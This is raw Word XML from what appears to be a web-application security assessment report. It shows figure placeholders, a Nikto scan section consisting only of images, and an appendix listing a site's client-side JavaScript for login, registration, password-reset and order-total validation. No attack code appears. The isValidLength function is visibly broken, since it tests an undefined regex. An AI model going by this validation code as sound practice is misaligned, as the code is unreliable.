      <w:tblGrid>
        <w:gridCol w:w="9468"/>
      </w:tblGrid>
      <w:tr w:rsidR="00300F7D" w14:paraId="703B844C" w14:textId="77777777" w:rsidTr="00300F7D">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9576" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="17478ACB" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="00300F7D" w:rsidP="00396EED">
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1EF5A182" wp14:editId="5041C0AE">
                  <wp:extent cx="2584174" cy="97546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4573" cy="983167"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EA44D70" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="00300F7D" w:rsidP="00396EED">
            <w:r>
              <w:t>Figure 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00300F7D" w14:paraId="122CCC87" w14:textId="77777777" w:rsidTr="00300F7D">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9576" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="364F43CF" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="00300F7D" w:rsidP="00396EED">
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0589C5DB" wp14:editId="11781297">
                  <wp:extent cx="3207275" cy="36098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461" cy="3666289"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="19E91AC4" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="00300F7D" w:rsidP="00396EED">
            <w:r>
              <w:t>Figure 2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EB49E62" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="00300F7D" w:rsidP="00396EED"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00300F7D" w14:paraId="71573251" w14:textId="77777777" w:rsidTr="00300F7D">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9576" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5BAF0FFD" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="00300F7D" w:rsidP="00396EED">
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="466DEEE4" wp14:editId="027277F9">
                  <wp:extent cx="2225996" cy="36257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6131" cy="3642304"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="6605388C" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="00300F7D" w:rsidP="00396EED">
            <w:r>
              <w:t>Figure 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00300F7D" w14:paraId="5AB4522C" w14:textId="77777777" w:rsidTr="00300F7D">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9576" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="39323700" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="00300F7D" w:rsidP="00396EED">
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7C714872" wp14:editId="20F53814">
                  <wp:extent cx="2401294" cy="190021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8582" cy="1905977"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="5674D24A" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="00300F7D" w:rsidP="00396EED">
            <w:r>
              <w:t>Figure 4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="52C15466" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="00300F7D" w:rsidP="00396EED">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DCFB4E7" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="00300F7D" w:rsidP="008641AC">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="65" w:name="_Toc58836614"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>1.3</w:t>
      </w:r>
      <w:r w:rsidR="008641AC">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Nikto Results</w:t>
      </w:r>
      <w:bookmarkEnd w:id="65"/>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid0"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="-108" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9468"/>
      </w:tblGrid>
      <w:tr w:rsidR="00300F7D" w14:paraId="5760013A" w14:textId="77777777" w:rsidTr="00300F7D">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9576" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="045BF8AF" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="00300F7D" w:rsidP="00396EED">
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7A7508A4" wp14:editId="76D97050">
                  <wp:extent cx="5931535" cy="2799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tc>
      </w:tr>
      <w:tr w:rsidR="00300F7D" w14:paraId="2C828284" w14:textId="77777777" w:rsidTr="00300F7D">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9576" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="191BFBFE" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="00300F7D" w:rsidP="00396EED">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:t>Figure 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="619F04A8" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="00300F7D" w:rsidP="00396EED">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00300F7D" w14:paraId="146CD9D0" w14:textId="77777777" w:rsidTr="00300F7D">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9576" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="25D5C17F" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="00300F7D" w:rsidP="00396EED">
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0EB6AD45" wp14:editId="1121DB74">
                  <wp:extent cx="5939790" cy="6121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612140"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00300F7D" w14:paraId="4DC02765" w14:textId="77777777" w:rsidTr="00300F7D">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9576" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2EECCEA4" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="00300F7D" w:rsidP="00396EED">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:t>Figure 2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5FB421E9" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="00300F7D" w:rsidP="00396EED">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C85C7C8" w14:textId="77777777" w:rsidR="00300F7D" w:rsidRDefault="001D0209" w:rsidP="008641AC">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="66" w:name="_Toc58836615"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2.1</w:t>
      </w:r>
      <w:r w:rsidR="008641AC">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> JavaScript Validation File</w:t>
      </w:r>
      <w:bookmarkEnd w:id="66"/>
    </w:p>
    <w:p w14:paraId="534DF8D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to handle login-form validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7150C20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loginValidate(loginForm){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4231340E" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74A6D3E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3F1D18F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5A52BA7A" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32C8CDD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(loginForm.login.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C8E4E3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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A5B269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errorMessage+="Email not filled!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E33DF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29CC72B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35A800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if(loginForm.password.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61EE24F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80D202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errorMessage+="Password not filled!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A982F4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3B5A4A8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1E8E1A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(!isValidEmail(loginForm.login.value)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E256C4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errorMessage+="Invalid email address provided!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB7CAD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1EE6FC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34309E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0DE07A6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7C488D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49C1E47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E666C9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2A60C20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CFFA8CE" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56FBDE1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to handle register-form validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17852BB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registerValidate(registerForm){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AEA1CBC" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="325D46A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3F6CD70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4D81F744" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DF7CFB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(registerForm.fname.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76E9259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953872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errorMessage+="Firstname not filled!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44744AF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3C6CCC3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4E3DFD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if(registerForm.lname.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="250FA80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4ADFBB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errorMessage+="Lastname not filled!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="019EA04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3D76B25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DA5379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(registerForm.login.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="165325D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EDFEF4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errorMessage+="Email not filled!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FEBD49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554724C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55ADF8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if(registerForm.password.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A3E13D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A8BD1C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errorMessage+="Password not provided!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50FAD13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4139581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FF44E4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if(registerForm.cpassword.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A6BEC4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95474F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errorMessage+="Confirm password not filled!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4818671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B38007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E770C5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if(registerForm.cpassword.value!=registerForm.password.value)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1821D63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52345E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errorMessage+="Password and Confirm Password do not match!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="153CC36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5720E0C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35CA33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(!isValidEmail(registerForm.login.value)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33ED414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errorMessage+="Invalid email address provided!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FEF112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validationVerified=false;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0171A10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F3BEC5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if(registerForm.question.selectedIndex==0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38E70BD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2BF1A7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errorMessage+="Question not selected!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48681B4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5CEA716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90CEEE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if(registerForm.answer.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="703705F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9ED997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errorMessage+="Answer not filled!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B25736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6C9E67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A9BB40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72575FD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D04A46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5622FF0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79E3E3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2CC627F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8F8E47C" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F623F2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email function</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="471D169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isValidEmail(val) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F8F99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r w:rsidRPr="00C3556C">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:tab/>
        <w:t>var re = /^[\w\+\'\.-]+@[\w\'\.-]+\.[a-zA-Z]{2,}$/;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078B37E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r w:rsidRPr="00C3556C">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:tab/>
        <w:t>if (!re.test(val)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02EC2E9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r w:rsidRPr="00C3556C">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00C3556C">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:tab/>
        <w:t>return false;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C383D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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA578B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return true;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131407E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27EF398" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B53D22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special PIN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39B2FEE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isValidSpecialPIN(val) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E9229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var re = /^[0-9][0-9][A-Z][A-Z][A-Z][0-9][0-9][0-9][0-9][0-9][0-9][0-9]$/;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64E078F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if (!re.test(val)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128E20A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r>
      <w:r w:rsidRPr="00C3556C">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:tab/>
        <w:t>return false;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7186AC7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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5692FAE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return true;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FAFD65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7BFB04F" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0FDBB09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special PIN length</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A11C43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isValidLength(val){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A0DFB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var length = 12;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34B2A39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if (!re.test(val)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="443A3E8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r>
      <w:r w:rsidRPr="00C3556C">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:tab/>
        <w:t>return false;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="097DB21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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3626B9A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return true;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06AE3C6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550F0DF" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D357B9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to handle passwordResetForm validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D3553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passwordResetValidate(resetForm){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41797833" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C05061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17C821E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73C8C07A" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="778CFF4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(resetForm.email.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="772B3E4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1004B9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enter your account email! We need your email in order to reset your password.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13616D3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1BA7FD7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6B3D5A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(!isValidEmail(resetForm.email.value)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1891E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errorMessage+="Invalid email address provided!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25A23F2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5C5CCAA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ED63CB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2BE3CAC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CE680F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11EE73A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3D8759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2222D44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D358B45" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A2C9EB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to handle passwordResetForm validation(2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD2E69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passwordResetValidate_2(resetForm){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E43924" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B710C9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0AFC058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016BA56B" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19B5A9E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(resetForm.answer.value==""){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6943C6F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enter your security answer to your provided security question.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6834614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3C84F93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458DE8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(resetForm.new_password.value==""){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="705E12C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errorMessage+="New Password not set!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64030A1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3A6542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EF6CFB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(resetForm.confirm_new_password.value==""){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D8C0CE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errorMessage+="Confirm New Password not set!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D8D1C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78F414B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6CC438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(resetForm.new_password.value!=resetForm.confirm_new_password.value){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2547FDD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errorMessage+="New Password and Confirm New Password do not match!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E212D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5CF9DE5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8D3320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5932230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375EB0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0DC73E1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FA5053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68C4FBA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7F7CB46" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="283E3BC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onchange of qty field entry totals the price</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768945F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getProductTotal(field) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4D354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clearErrorInfo();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C0188A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form = field.form;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E57BA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if (field.value == "") field.value = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BC502C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if ( !isPosInt(field.value) ) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0008F2C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msg = 'Please enter a positive integer for quantity.';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7256654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addValidationMessage(msg);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77783C5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addValidationField(field)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AAFE4A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displayErrorInfo( form );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E35E5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return;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A705A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 else {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638F92A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r>
      <w:r w:rsidRPr="00C3556C">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">var product = field.name.slice(0, field.name.lastIndexOf("_") ); </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15FB08F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price = form.elements[product + "_price"].value;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A93807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r>
      <w:r w:rsidRPr="00C3556C">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:tab/>
        <w:t>var amt = field.value * price;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B4FAF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r>
      <w:r w:rsidRPr="00C3556C">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:tab/>
        <w:t>form.elements[product + "_tot"].value = formatDecimal(amt);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="250C175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r>
      <w:r w:rsidRPr="00C3556C">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:tab/>
        <w:t>doTotals(form);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BE74C8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b/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="536EAEA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8301D6E" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48E5E51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doTotals(form) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3692A54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total = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32DB93A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for (var i=0; PRODUCT_ABBRS[i]; i++) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CBC0EA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cur_field = form.elements[ PRODUCT_ABBRS[i] + "_qty" ]; </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="458A5A0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if ( !isPosInt(cur_field.value) ) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67ADB8E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msg = 'Please enter a positive integer for quantity.';</w:t>
      </w:r>
